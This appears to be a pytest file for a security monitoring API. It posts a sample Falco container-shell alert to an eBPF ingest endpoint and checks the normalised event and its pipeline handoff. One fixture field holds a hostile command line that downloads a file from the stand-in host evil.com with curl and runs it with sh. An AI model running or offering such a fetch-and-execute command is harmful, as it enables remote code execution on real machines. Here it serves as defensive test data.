import json
import time
from fastapi.testclient import TestClient
from src.api.app import app

falco_example = {
    "output": "Shell spawned in container",
    "priority": "Warning",
    "rule": "Terminal shell in container",
    "time": "2025-10-28T10:30:45.123456Z",
    "output_fields": {
        "container.id": "abc123",
        "container.image.repository": "nginx",
        "proc.cmdline": "/bin/bash -c 'curl http://evil.com -o /tmp/x; /bin/sh /tmp/x'",
        "user.name": "www-data",
        "evt.type": "execve",
        "host.hostname": "host-test-1"
    }
}


def test_ebpf_ingest_handoff(monkeypatch):
    called = {}

    async def fake_process_event(self, ev):
        called['ev'] = ev
        return None

    # Attempt to patch EventPipeline.process_event if importable; otherwise
    # we'll still validate normalization only.
    try:
        import src.core.event_pipeline.pipeline as pp
        monkeypatch.setattr(pp.EventPipeline, 'process_event', fake_process_event)
        patched = True
    except Exception:
        patched = False

    # Mount ingest handler on a small test app to avoid heavy imports
    from fastapi import FastAPI
    from src.api.ebpf_endpoints import ingest_ebpf_event
    tiny = FastAPI()
    tiny.post('/api/v1/events/ebpf_ingest')(ingest_ebpf_event)
    client = TestClient(tiny)
    r = client.post('/api/v1/events/ebpf_ingest', json=falco_example)
    assert r.status_code == 200
    j = r.json()
    assert j.get('status') == 'ok'
    # if handoff was patched, allow a brief moment for background task to run
    if patched:
        import time
        # some envs fire the pipeline asynchronously; wait briefly
        time.sleep(0.05)
        assert called, 'EventPipeline.process_event was not invoked'
        ev = called['ev']
        assert ev.get('source') == 'falco_ebpf' or ev.get('event_type') == 'container_runtime'
        assert 'rule_name' in ev or 'raw_output' in ev
    else:
        # pipeline module not importable; at least ensure normalization succeeded
        # (the endpoint returns severity on success)
        assert j.get('severity') in ('low', 'medium', 'high', 'critical', 'info')